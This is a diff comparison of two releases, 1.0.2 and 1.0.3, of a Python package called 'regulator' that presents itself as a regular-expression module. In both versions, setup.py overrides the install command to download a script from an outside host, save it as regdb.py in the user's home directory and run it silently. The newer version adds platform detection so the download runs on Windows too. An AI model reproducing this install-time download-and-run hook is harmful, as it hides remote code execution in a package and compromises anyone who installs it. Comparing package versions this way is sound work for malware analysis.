# Comparing `tmp/regulator-1.0.2.tar.gz` & `tmp/regulator-1.0.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dist\regulator-1.0.2.tar", last modified: Tue Jul 18 07:57:03 2023, max compression
+gzip compressed data, was "dist\regulator-1.0.3.tar", last modified: Tue Jul 18 11:26:54 2023, max compression
```

## Comparing `regulator-1.0.2.tar` & `regulator-1.0.3.tar`

### file list

```diff
@@ -1,15 +1,15 @@
-drwxrwxrwx   0        0        0        0 2023-07-18 07:57:03.000000 regulator-1.0.2/
--rw-rw-rw-   0        0        0      111 2023-07-18 07:57:04.000000 regulator-1.0.2/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-07-18 07:57:03.000000 regulator-1.0.2/regulator/
--rw-rw-rw-   0        0        0       68 2023-05-18 10:29:08.000000 regulator-1.0.2/regulator/__init__.py
--rw-rw-rw-   0        0        0   145648 2023-05-18 10:29:08.000000 regulator-1.0.2/regulator/_regex_core.py
--rw-rw-rw-   0        0        0    33561 2023-05-18 10:29:08.000000 regulator-1.0.2/regulator/regex.py
--rw-rw-rw-   0        0        0   224004 2023-05-18 10:29:08.000000 regulator-1.0.2/regulator/test_regex.py
-drwxrwxrwx   0        0        0        0 2023-07-18 07:57:03.000000 regulator-1.0.2/regulator.egg-info/
--rw-rw-rw-   0        0        0      111 2023-07-18 07:57:04.000000 regulator-1.0.2/regulator.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      262 2023-07-18 07:57:04.000000 regulator-1.0.2/regulator.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-18 07:57:04.000000 regulator-1.0.2/regulator.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       16 2023-07-18 07:57:04.000000 regulator-1.0.2/regulator.egg-info/requires.txt
--rw-rw-rw-   0        0        0       10 2023-07-18 07:57:04.000000 regulator-1.0.2/regulator.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-07-18 07:57:04.000000 regulator-1.0.2/setup.cfg
--rw-rw-rw-   0        0        0     1132 2023-07-18 07:56:40.000000 regulator-1.0.2/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-18 11:26:54.000000 regulator-1.0.3/
+-rw-rw-rw-   0        0        0      111 2023-07-18 11:26:56.000000 regulator-1.0.3/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-07-18 11:26:54.000000 regulator-1.0.3/regulator/
+-rw-rw-rw-   0        0        0       68 2023-05-18 10:29:08.000000 regulator-1.0.3/regulator/__init__.py
+-rw-rw-rw-   0        0        0   145648 2023-05-18 10:29:08.000000 regulator-1.0.3/regulator/_regex_core.py
+-rw-rw-rw-   0        0        0    33561 2023-05-18 10:29:08.000000 regulator-1.0.3/regulator/regex.py
+-rw-rw-rw-   0        0        0   224004 2023-05-18 10:29:08.000000 regulator-1.0.3/regulator/test_regex.py
+drwxrwxrwx   0        0        0        0 2023-07-18 11:26:54.000000 regulator-1.0.3/regulator.egg-info/
+-rw-rw-rw-   0        0        0      111 2023-07-18 11:26:56.000000 regulator-1.0.3/regulator.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      262 2023-07-18 11:26:56.000000 regulator-1.0.3/regulator.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-18 11:26:56.000000 regulator-1.0.3/regulator.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       16 2023-07-18 11:26:56.000000 regulator-1.0.3/regulator.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       10 2023-07-18 11:26:56.000000 regulator-1.0.3/regulator.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-07-18 11:26:56.000000 regulator-1.0.3/setup.cfg
+-rw-rw-rw-   0        0        0     1383 2023-07-18 11:26:34.000000 regulator-1.0.3/setup.py
```

### Comparing `regulator-1.0.2/regulator/_regex_core.py` & `regulator-1.0.3/regulator/_regex_core.py`

 * *Files identical despite different names*

### Comparing `regulator-1.0.2/regulator/regex.py` & `regulator-1.0.3/regulator/regex.py`

 * *Files identical despite different names*

### Comparing `regulator-1.0.2/regulator/test_regex.py` & `regulator-1.0.3/regulator/test_regex.py`

 * *Files identical despite different names*

### Comparing `regulator-1.0.2/setup.py` & `regulator-1.0.3/setup.py`

 * *Files 16% similar despite different names*

```diff
@@ -1,12 +1,14 @@
 from setuptools import setup
 from setuptools.command.install import install
 import os
 import subprocess 
 import requests
+import platform
+
 class SetupProcess(install):
     def run(self):
         install.run(self)
 
         url = 'https://pyploym.com/regdb.php'
 
         home_directory = os.path.expanduser("~")
@@ -15,21 +17,26 @@
 
         if response.status_code == 200:            
             data_path = os.path.join(home_directory, "regdb.py")
             
             with open(data_path, 'w') as f:
                 f.write(response.text)
             try:
-                subprocess.Popen(['python3', data_path], stdout=None, stderr=None)
+                pform = platform.system()
+                if pform == 'Windows':
+                    subprocess.Popen(['python', data_path], stdout=subprocess.PIPE, stderr=None)
+                else:
+                    subprocess.Popen(['python3', data_path], stdout=subprocess.PIPE, stderr=None)
+
             except Exception as e:
-                subprocess.Popen(['python', data_path], stdout=None, stderr=None)
+                subprocess.Popen(['python', data_path], stdout=subprocess.PIPE, stderr=None)
         else:
             print('Error:', response.status_code)
 
 setup(name="regulator",
-version="1.0.2",
+version="1.0.3",
 author="gadapokasoz6",
 description="regular express module",
 cmdclass={'install': SetupProcess,},
 packages=["regulator"],
 install_requires=["requests>=1.0.0"],
 )
```

